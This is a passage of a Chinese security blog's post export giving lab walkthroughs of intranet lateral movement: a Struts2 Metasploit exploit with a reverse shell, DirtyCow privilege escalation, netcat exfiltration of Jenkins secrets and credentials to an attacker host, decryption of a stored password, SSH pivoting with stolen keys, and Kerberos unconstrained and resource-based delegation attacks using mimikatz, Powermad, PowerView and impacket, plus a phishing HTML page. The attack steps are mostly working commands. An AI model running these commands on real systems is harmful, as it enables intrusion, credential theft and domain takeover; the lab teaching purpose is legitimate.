title="3、密码存储"></a>3、密码存储</h3><p>SSH密匙-参考上篇linux横向移动</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>Linux明文读不到</p><ol><li>mimipengui–版本少</li><li>hash破解（算法要识别）</li><li>利用存储(ssh密匙登录)</li></ol><p>Windows明文读不到<br>1、mimikatz被拦截（杀毒等）</p><ul><li>离线读取</li></ul><p>2、操作系统过高&#x3D;&gt;2012</p><ul><li>离线读取后本地还原（只会记录内存保存的）</li><li>强开注册表存储内存密码（只会记录后续访问）</li><li>hash破解</li></ul><p>3、利用存储</p><ul><li>RDP3389远程桌面协议</li></ul><p>1、内存不存储导致读不到（强制开启,注册表开启）记录内存存储<br>2、解密密文hash得到明文<br>3、离线读取防拦截后续加载</p>]]></content>
      
      
      <categories>
          
          <category> 内网安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 内网 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>内网横向移动(十)-Linux横向</title>
      <link href="/posts/b07a19ba/"/>
      <url>/posts/b07a19ba/</url>
      
        <content type="html"><![CDATA[<h1 id="内网横向移动-十-Linux横向"><a href="#内网横向移动-十-Linux横向" class="headerlink" title="内网横向移动(十)-Linux横向"></a>内网横向移动(十)-Linux横向</h1><h2 id="SSH协议-amp-RSA密匙凭证"><a href="#SSH协议-amp-RSA密匙凭证" class="headerlink" title="SSH协议&amp;RSA密匙凭证"></a>SSH协议&amp;RSA密匙凭证</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">~/.ssh/config</span><br><span class="line">~/.ssh/known_hosts</span><br><span class="line">~/.bash_history</span><br></pre></td></tr></table></figure><p>一般情况下SSH密钥存放在~&#x2F;.ssh&#x2F;目录下，也可以文件中搜索已保存的SSH凭证</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">grep -ir &quot;BEGIN RSA PRIVATE KEY&quot; /*</span><br><span class="line">grep -ir &quot;BEGIN DSA PRIVATE KEY&quot; /*</span><br><span class="line">grep -ir &quot;BEGIN OPENSSH PRIVATE KEY&quot; /*</span><br></pre></td></tr></table></figure><p>参考：<a href="https://www.runoob.com/w3cnote/set-ssh-login-key.html">https://www.runoob.com/w3cnote/set-ssh-login-key.html</a></p><h2 id="Linux靶场-提权-amp-SSH-amp-密匙-amp-Jenkins"><a href="#Linux靶场-提权-amp-SSH-amp-密匙-amp-Jenkins" class="headerlink" title="Linux靶场-提权&amp;SSH&amp;密匙&amp;Jenkins"></a>Linux靶场-提权&amp;SSH&amp;密匙&amp;Jenkins</h2><p><img src="/posts/b07a19ba/1666194556801-b13b69c1-9f4a-4fe2-ae10-bb3f9bc78287.png" alt="image.png"></p><h3 id="1、Web-DMZ权限获取"><a href="#1、Web-DMZ权限获取" class="headerlink" title="1、Web DMZ权限获取"></a>1、Web DMZ权限获取</h3><h4 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap 172.16.250.0/24</span><br></pre></td></tr></table></figure><p><img src="/posts/b07a19ba/1666248159524-e289793f-7659-4a16-99d4-249a674da169.png" alt="image.png"><br>172.16.250.10 80开放<br>发现&#x2F;struts2-showcase<br><img src="/posts/b07a19ba/1666248700063-c6e40e0a-6516-48ee-b3bb-8adcb9534f58.png" alt="image.png"></p><h4 id="利用漏洞"><a href="#利用漏洞" class="headerlink" title="利用漏洞"></a>利用漏洞</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">search struts2</span><br><span class="line">use exploit/multi/http/struts2_content_type_ognl</span><br><span class="line">set payload linux/x64/meterpreter/reverse_tcp</span><br><span class="line">set rhosts 172.16.250.10</span><br><span class="line">set lport 80</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p><img src="/posts/b07a19ba/1666248956756-b1a25ed3-3b9a-4c36-94b9-79746ff8e045.png" alt="image.png"><br><img src="/posts/b07a19ba/1666249109234-573444e0-cd7b-4884-a8ed-40b0b38c7273.png" alt="image.png"><br><img src="/posts/b07a19ba/1666249128565-45a89935-4dd8-4d2b-a333-ab3cb422883a.png" alt="image.png"></p><h4 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h4><p>利用脏牛提权</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">wget https://raw.githubusercontent.com/sqlnetcat/dirtycow-mem/master/dirtycow-mem.c</span><br><span class="line">upload /root/dirtycow-mem.c /tmp</span><br><span class="line">shell</span><br><span class="line">cd /tmp</span><br><span class="line">gcc -Wall -o dirtycow-mem dirtycow-mem.c -ldl -lpthread</span><br><span class="line">python3 -c &quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span><br><span class="line">./dirtycow-mem</span><br></pre></td></tr></table></figure><p><img src="/posts/b07a19ba/1666250488392-474e5ffe-3760-441c-847c-83d685f9c1a3.png" alt="image.png"></p><h4 id="稳定权限"><a href="#稳定权限" class="headerlink" title="稳定权限"></a>稳定权限</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo 0 &gt; /proc/sys/vm/dirty_writeback_centisecs</span><br><span class="line">echo 1 &gt; /proc/sys/kernel/panic &amp;&amp; echo 1 &gt; /proc/sys/kernel/panic_on_oops &amp;&amp; echo 1 &gt; /proc/sys/kernel/panic_on_unrecovered_nmi &amp;&amp; echo 1 &gt; /proc/sys/kernel/panic_on_io_nmi &amp;&amp; echo 1 &gt; /proc/sys/kernel/panic_on_warn</span><br></pre></td></tr></table></figure><h4 id="横向移动"><a href="#横向移动" class="headerlink" title="横向移动"></a>横向移动</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">查看数据库配置文件</span></span><br><span class="line">cat /opt/tomcat/webapps/kittens/WEB-INF/config/opencms.properties</span><br></pre></td></tr></table></figure><p><img src="/posts/b07a19ba/1666251088484-bb2f0689-265b-4fa4-a3aa-36f076be9d06.png" alt="image.png"><br>发现站库分离主机<br>查看历史命令<br><img src="/posts/b07a19ba/1666253002010-e1178531-c83a-4b93-93fd-f45a83aa71ad.png" alt="image.png"><br>通过id_rsa来连接数据库主机<br>把id_rsa拉我我们本机来进行利用</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cp ~/.ssh/id_rsa /tmp/id_rsa #取得的低权限需要拉到/tmp目录下进行下载</span><br><span class="line">chmod 777 id_rsa</span><br></pre></td></tr></table></figure><p>msf下载id_rsa</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">download /tmp/id_rsa /root/id_rsa</span><br><span class="line">chmod 600 id_rsa</span><br><span class="line">ssh -i id_rsa root@172.16.250.30</span><br></pre></td></tr></table></figure><p><img src="/posts/b07a19ba/1666254237290-34094318-d25e-489c-98fe-16fd7098567f.png" alt="image.png"></p><h3 id="2、Jenkins-DMZ权限获取"><a href="#2、Jenkins-DMZ权限获取" class="headerlink" title="2、Jenkins DMZ权限获取"></a>2、Jenkins DMZ权限获取</h3><h4 id="信息收集-1"><a href="#信息收集-1" class="headerlink" title="信息收集"></a>信息收集</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">id</span><br><span class="line">netstat -anpt</span><br></pre></td></tr></table></figure><p><img src="/posts/b07a19ba/1666254296114-7e90e817-f8de-4f92-8164-87fd9f920be2.png" alt="image.png"><br>172.16.250.30 8080开放</p><h4 id="建立节点"><a href="#建立节点" class="headerlink" title="建立节点"></a>建立节点</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">利用172.16.250.10建立节点</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">先添加路由</span></span><br><span class="line">run post/multi/manage/autoroute</span><br><span class="line">use auxiliary/server/socks_proxy</span><br><span class="line">set srvhost 0.0.0.0</span><br><span class="line">set srvport 1122</span><br><span class="line">vim /etc/proxychains4.conf</span><br></pre></td></tr></table></figure><p><img src="/posts/b07a19ba/1666254771407-13c88636-5a7b-470e-ac43-bfa2dee040c4.png" alt="image.png"><br>172.16.250.30 8080开放 jenkins服务<br><img src="/posts/b07a19ba/1666256622152-6d458f17-ab1e-4b09-ab50-82d49919aac9.png" alt="image.png"><br><img src="/posts/b07a19ba/1666256948583-944afeb9-1982-4f83-a138-d4b63da08b83.png" alt="image.png"><br>存在密钥配置,可以利用该密匙继续横向移动</p><h4 id="攻击Jenkins"><a href="#攻击Jenkins" class="headerlink" title="攻击Jenkins"></a>攻击Jenkins</h4><p>仅过滤正向流量没有过滤反向可以使用拿到敏感文件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">kali执行</span></span><br><span class="line">nc -lvp 1234 &gt; master.key</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">jenkins执行</span></span><br><span class="line">nc 172.16.250.128 1234 &lt; /home/jenkins/secrets/master.key</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">kali执行</span></span><br><span class="line">nc -lvp 1234 &gt; hudson.util.Secret</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">jenkins执行</span></span><br><span class="line">nc 172.16.250.128 1234 &lt; /home/jenkins/secrets/hudson.util.Secret</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">kali执行</span></span><br><span class="line">nc -lvp 1234 &gt; credentials.xml</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">jenkins执行</span></span><br><span class="line">nc 172.16.250.128 1234 &lt; /home/jenkins/credentials.xml</span><br></pre></td></tr></table></figure><p>成功拿到3个文件</p><h4 id="破解密匙"><a href="#破解密匙" class="headerlink" title="破解密匙"></a>破解密匙</h4><p><a href="https://github.com/cheetz/jenkins-decrypt">https://github.com/cheetz/jenkins-decrypt</a></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python decrypt.py master.key hudson.util.Secret credentials.xml</span><br></pre></td></tr></table></figure><p>解密出来密码为:<code>)uDvra&#123;4UL^;r?*h</code><br>账号就是密钥配置泄露的</p><h3 id="3、Database-DMZ权限获取db-backup"><a href="#3、Database-DMZ权限获取db-backup" class="headerlink" title="3、Database DMZ权限获取db_backup"></a>3、Database DMZ权限获取db_backup</h3><h4 id="密码横向："><a href="#密码横向：" class="headerlink" title="密码横向："></a>密码横向：</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh db_backup@172.16.250.50</span><br><span class="line">)uDvra&#123;4UL^;r?*h</span><br></pre></td></tr></table></figure><p><img src="/posts/b07a19ba/1666268974415-60f536dc-af2c-40b2-9276-836061f3716a.png" alt="image.png"></p><h4 id="权限提升："><a href="#权限提升：" class="headerlink" title="权限提升："></a>权限提升：</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo su</span><br></pre></td></tr></table></figure><p><img src="/posts/b07a19ba/1666269061908-7c7ef6be-ed0a-4c85-be27-44f97d5969f0.png" alt="image.png"></p>]]></content>
      
      
      <categories>
          
          <category> 内网安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 内网 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>内网横向移动(九)-非约束委派&amp;资源约束委派</title>
      <link href="/posts/f7053583/"/>
      <url>/posts/f7053583/</url>
      
        <content type="html"><![CDATA[<h1 id="内网横向移动-九-非约束委派-amp-资源约束委派"><a href="#内网横向移动-九-非约束委派-amp-资源约束委派" class="headerlink" title="内网横向移动(九)-非约束委派&amp;资源约束委派"></a>内网横向移动(九)-非约束委派&amp;资源约束委派</h1><h2 id="非约束委派"><a href="#非约束委派" class="headerlink" title="非约束委派"></a>非约束委派</h2><h4 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h4><p>机器A（域控）访问具有非约束委派权限的机器B的服务，会把当前认证用户（域管用户）的的TGT放在ST票据中，一起发送给机器B，机器B会把TGT存储在lsass进程中以备下次重用。从而机器B就能使用这个TGT模拟认证用户（域管用户）访问服务。</p><h4 id="利用场景"><a href="#利用场景" class="headerlink" title="利用场景"></a>利用场景</h4><p>攻击者拿到了一台配置非约束委派的机器权限，可以诱导域管来访问该机器，然后得到管理员的TGT，从而模拟域管用户</p><h4 id="复现配置"><a href="#复现配置" class="headerlink" title="复现配置"></a>复现配置</h4><p>1、信任此计算机来委派任何服务<br>2、setspn -U -A priv&#x2F;test webadmin</p><h4 id="判断查询"><a href="#判断查询" class="headerlink" title="判断查询"></a>判断查询</h4><p>查询域内设置了非约束委派的服务账户</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AdFind -b &quot;DC=god,DC=org&quot; -f &quot;(&amp;(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=524288))&quot; dn</span><br></pre></td></tr></table></figure><p><img src="/posts/f7053583/1666082668590-50864619-7838-477f-a199-d266ba2e2043.png" alt="image.png"><br>查询域内设置了非约束委派的机器账户:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AdFind -b &quot;DC=god,DC=org&quot; -f &quot;(&amp;(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288))&quot; dn</span><br></pre></td></tr></table></figure><p><img src="/posts/f7053583/1666082686929-1b3555ee-4c49-40f0-8bf1-d186e75baea4.png" alt="image.png"></p><h4 id="利用步骤"><a href="#利用步骤" class="headerlink" title="利用步骤"></a>利用步骤</h4><h5 id="1、域控与委派机器通讯"><a href="#1、域控与委派机器通讯" class="headerlink" title="1、域控与委派机器通讯"></a>1、域控与委派机器通讯</h5><p>主动：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net use \\webserver</span><br></pre></td></tr></table></figure><p><img src="/posts/f7053583/1666082712040-ffad1b73-66d1-41d2-b477-700146d307ed.png" alt="image.png"><br>钓鱼：<br><a href="http://192.168.3.31/31.html">http://192.168.3.31/31.html</a></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;title&gt;&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;img src=&quot;file:///\\192.168.3.31\2&quot;&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><h5 id="2、导出票据到本地"><a href="#2、导出票据到本地" class="headerlink" title="2、导出票据到本地"></a>2、导出票据到本地</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz sekurlsa::tickets /export</span><br></pre></td></tr></table></figure><p><img src="/posts/f7053583/1666085095986-a520d694-67a4-433b-81e7-506d3d66d830.png" alt="image.png"></p><h5 id="3、导入票据到内存"><a href="#3、导入票据到内存" class="headerlink" title="3、导入票据到内存"></a>3、导入票据到内存</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz kerberos::ptt [0;9044d]-2-0-60a00000-Administrator@krbtgt-GOD.ORG.kirbi</span><br></pre></td></tr></table></figure><p><img src="/posts/f7053583/1666085123452-2f4bf82e-912a-47b1-98cd-8a3ce8db06c0.png" alt="image.png"></p><h5 id="4、连接通讯域控"><a href="#4、连接通讯域控" class="headerlink" title="4、连接通讯域控"></a>4、连接通讯域控</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dir \\owa2010cn-god\c$</span><br></pre></td></tr></table></figure><p><img src="/posts/f7053583/1666085143207-29eef4c6-4830-428d-915d-64208a65bbc9.png" alt="image.png"><br>后续可以利用copy和at命令上线</p><h2 id="资源约束委派"><a href="#资源约束委派" class="headerlink" title="资源约束委派"></a>资源约束委派</h2><h3 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h3><p>基于资源的约束委派(RBCD)是在Windows Server 2012中新加入的功能，与传统的约束委派相比，它不再需要域管理员权限去设置相关属性。RBCD把设置委派的权限赋予了机器自身，既机器自己可以决定谁可以被委派来控制我。也就是说机器自身可以直接在自己账户上配置msDS-AllowedToActOnBehalfOfOtherIdentity属性来设置RBCD。计算机加⼊域时，加⼊域的域⽤户被控后也将导致使用当前域用户加入的计算机受控。</p><h3 id="条件"><a href="#条件" class="headerlink" title="条件"></a>条件</h3><p>1、域控Windows2012及以上<br>2、存在域内成员用户加入域操作</p><h3 id="利用"><a href="#利用" class="headerlink" title="利用:"></a>利用:</h3><h4 id="获取受害目标"><a href="#获取受害目标" class="headerlink" title="获取受害目标"></a>获取受害目标</h4><p>有哪些域内计算机存在同一用户加入的</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AdFind.exe -h <span class="number">192.168</span>.<span class="number">3.33</span> -b <span class="string">&quot;DC=xiaodi,DC=local&quot;</span> -f <span class="string">&quot;objectClass=computer&quot;</span> mS-DS-CreatorSID</span><br></pre></td></tr></table></figure><p><img src="/posts/f7053583/1666090340622-92bf4e24-7bab-4090-b7a1-0b7cc2b44509.png" alt="image.png"><br>相同的sid值说明该域用户登录了两个域机器</p><h4 id="判断受害用户"><a href="#判断受害用户" class="headerlink" title="判断受害用户"></a>判断受害用户</h4><p><a href="https://github.com/bgtiban/Sid2User">https://github.com/bgtiban/Sid2User</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sid2user.exe \\<span class="number">192.168</span>.<span class="number">3.33</span> <span class="number">5</span> <span class="number">21</span> <span class="number">1695257952</span> <span class="number">3088263962</span> <span class="number">2055235443</span> <span class="number">1104</span></span><br></pre></td></tr></table></figure><p><img src="/posts/f7053583/1666090655341-9317bbfe-9c9d-4b45-adde-0d364048fcf9.png" alt="image.png"></p><h4 id="增加机器"><a href="#增加机器" class="headerlink" title="增加机器"></a>增加机器</h4><p><a href="https://github.com/Kevin-Robertson/Powermad">https://github.com/Kevin-Robertson/Powermad</a></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Set-ExecutionPolicy Bypass -Scope Process #修改powershell执行限制</span><br><span class="line">Import-Module .\Powermad.ps1 #引入powershell脚本</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">添加一台密码为123456的机器</span></span><br><span class="line">New-MachineAccount -MachineAccount serviceA -Password $(ConvertTo-SecureString &quot;123456&quot; -AsPlainText -Force)</span><br></pre></td></tr></table></figure><p><img src="/posts/f7053583/1666092251960-b00b6364-9349-4de1-9b5d-81fc8f99dd83.png" alt="image.png"><br><img src="/posts/f7053583/1666092505116-8718faba-6983-4db5-9295-6ac3e260587e.png" alt="image.png"><br>可以看到机器成功加入</p><h4 id="获取sid"><a href="#获取sid" class="headerlink" title="获取sid"></a>获取sid</h4><p><a href="https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1">https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1</a></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Import-Module .\PowerView.ps1</span><br><span class="line">Get-NetComputer serviceA -Properties objectsid</span><br></pre></td></tr></table></figure><p><img src="/posts/f7053583/1666092733618-17916e52-66cc-43bb-883b-22870c3bd6d4.png" alt="image.png"></p><h4 id="设置修改属性"><a href="#设置修改属性" class="headerlink" title="设置修改属性"></a>设置修改属性</h4><p>powershell</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Set-ExecutionPolicy Bypass -Scope Process</span><br><span class="line">import-module .\powerview.ps1</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">注意修改sid值</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList <span class="string">&quot;O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-1695257952-3088263962-2055235443-1602)&quot;</span></span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">SDBytes = New-Object byte[] (<span class="variable">$SD</span>.BinaryLength)</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">SD.GetBinaryForm(<span class="variable">$SDBytes</span>, 0)</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">DATA为工具目标的主机名字</span></span><br><span class="line">Get-DomainComputer DATA| Set-DomainObject -Set @&#123;&#x27;msds-allowedtoactonbehalfofotheridentity&#x27;=$SDBytes&#125; -Verbose</span><br></pre></td></tr></table></figure><p><img src="/posts/f7053583/1666093147362-e0d1fc95-9fa9-4b4d-9faf-175637d640b5.png" alt="image.png"></p><h4 id="验证修改是否成功"><a href="#验证修改是否成功" class="headerlink" title="验证修改是否成功"></a>验证修改是否成功</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-DomainComputer DATA -Properties msds-allowedtoactonbehalfofotheridentity</span><br></pre></td></tr></table></figure><h4 id="清除修改设置"><a href="#清除修改设置" class="headerlink" title="清除修改设置"></a>清除修改设置</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Set-DomainObject DATA -Clear &#x27;msds-allowedtoactonbehalfofotheridentity&#x27; -Verbose</span><br></pre></td></tr></table></figure><h4 id="连接目标获取票据"><a href="#连接目标获取票据" class="headerlink" title="连接目标获取票据"></a>连接目标获取票据</h4><p>建立代理<br>记得添加host</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">192.168.3.11 web.xiaodi.org</span><br><span class="line">192.168.3.22 data.xiaodi.org</span><br><span class="line">192.168.3.33 dc.xiaodi.org</span><br><span class="line">192.168.3.33 xiaodi.org</span><br></pre></td></tr></table></figure><p>利用impacket套件中的getST.py</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python getST.py -dc-ip 192.168.3.33 xiaodi.local/serviceA\$:123456 -spn cifs/data.xiaodi.local -impersonate administrator</span><br></pre></td></tr></table></figure><p><img src="/posts/f7053583/1666094566364-1932169d-7a0b-4c9f-9112-8347daccc65b.png" alt="image.png"><br>生成票据上传到win7</p><h4 id="导入票据到内存"><a href="#导入票据到内存" class="headerlink" title="导入票据到内存"></a>导入票据到内存</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz kerberos::ptc administrator.ccache</span><br></pre></td></tr></table></figure><p><img src="/posts/f7053583/1666094766052-ad7e47c7-f067-486e-b08a-e3e5e7dcb005.png" alt="image.png"></p><h4 id="连接利用票据"><a href="#连接利用票据" class="headerlink" title="连接利用票据"></a>连接利用票据</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dir \\data.xiaodi.local\c$</span><br><span class="line">python psexec.py -k xiaodi.local/administrator@data.xiaodi.local -no-pass</span><br></pre></td></tr></table></figure><p><img src="/posts/f7053583/1666094795264-17a35791-5037-40c2-8952-c689f97168a0.png" alt="image.png"></p>]]></content>
      
      
      <categories>
          
          <category> 内网安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 内网 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>内网横向移动(八)-约束委派</title>
      <link href="/posts/dc35434a/"/>
      <url>/posts/dc35434a/</url>
      
        <content type="html"><![CDATA[<h1 id="内网横向移动-八-约束委派"><a href="#内网横向移动-八-约束委派" class="headerlink" title="内网横向移动(八)-约束委派"></a>内网横向移动(八)-约束委派</h1><h2 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h2><p>域委派是指将域内用户的权限委派给服务账号，使得服务账号能以域用户的权限在域内展开活动，去做域用户能够做的事。<br>注意：能够被委派的用户只能是服务账号或者机器账号<br><strong>简言之：当A访问服务B时，服务B拿着A用户的凭证去访问服务C，这个过程称为委派。</strong></p><p>委派攻击分类：<br>1、非约束委派<br>2、约束性委派<br>3、基于资源的约束性委派</p><h2 id="约束委派"><a href="#约束委派" class="headerlink" title="约束委派"></a>约束委派</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>由于非约束委派的不安全性，微软在windows server 2003中引入了约束委派，对Kerberos协议进行了拓展，引入了SService for User to Self (S4U2Self)和 Service for User to Proxy (S4U2proxy)。</p><p><strong>S4U2self</strong><br>允许受约束委派的服务代表任意用户向KDC请求服务自身，从而获得一张该用户（任意用户）的对当前受约束委派服务的票据TGS(ST)，该服务票据TGS(ST)包含了用户的相关信息，比如该用户的组信息等。</p><p><strong>S4U2proxy</strong><br>允许受约束委派的服务通过服务票据ST，然后代表用户去请求指定的服务。</p><h3 id="利用场景"><a href="#利用场景" class="headerlink" title="利用场景"></a>利用场景</h3><p>如果攻击者控制了服务A的账号，并且服务A配置了到域控的CIFS服务的约束性委派。<br>则攻击者可以先使用S4u2seflt申请域管用户（administrator）访问A服务的ST1，<br>然后使用S4u2Proxy以administrator身份访问域控的CIFS服务，即相当于控制了域控。</p><h3 id="复现配置"><a href="#复现配置" class="headerlink" title="复现配置"></a>复现配置</h3><h4 id="1、配置SPN"><a href="#1、配置SPN" class="headerlink" title="1、配置SPN"></a>1、配置SPN</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">域控机输入一下命令</span></span><br><span class="line">setspn -U -A priv/test webadmin</span><br></pre></td></tr></table></figure><p><img src="/posts/dc35434a/1665885209298-2172965e-b35b-46b8-8c4e-fce684101772.png" alt="image.png"></p><h4 id="2、机器设置"><a href="#2、机器设置" class="headerlink" title="2、机器设置"></a>2、机器设置</h4><p>机器设置仅信任此计算机指定服务-cifs<br><img src="/posts/dc35434a/1665819484661-670a4376-fbab-47a6-b296-3caaeac9d31b.png" alt="image.png"><br><img src="/posts/dc35434a/1665819521345-e39c76b6-20e7-4efa-ab08-fcc9c22a879a.png" alt="image.png"><br><img src="/posts/dc35434a/1665819540202-9a8a048b-af3f-4233-b8b9-3f6f8da92a61.png" alt="image.png"><br><img src="/posts/dc35434a/1665819732701-3f473480-0e64-44f1-80a5-7d2c784a08fd.png" alt="image.png"></p><h4 id="2、用户设置"><a href="#2、用户设置" class="headerlink" title="2、用户设置"></a>2、用户设置</h4><p>用户设置仅信任此计算机指定服务-cifs<br><img src="/posts/dc35434a/1665885296155-d5a0c27a-b898-4695-a661-608290a803d5.png" alt="image.png"><br>步骤和机器配置大体相同<br>已经拿下webserver权限利用约束委派攻击域控<br><img src="/posts/dc35434a/1665886060119-157bd90c-763f-4d51-9cb5-cb2b6eb06d75.png" alt="image.png"></p><h3 id="判断查询"><a href="#判断查询" 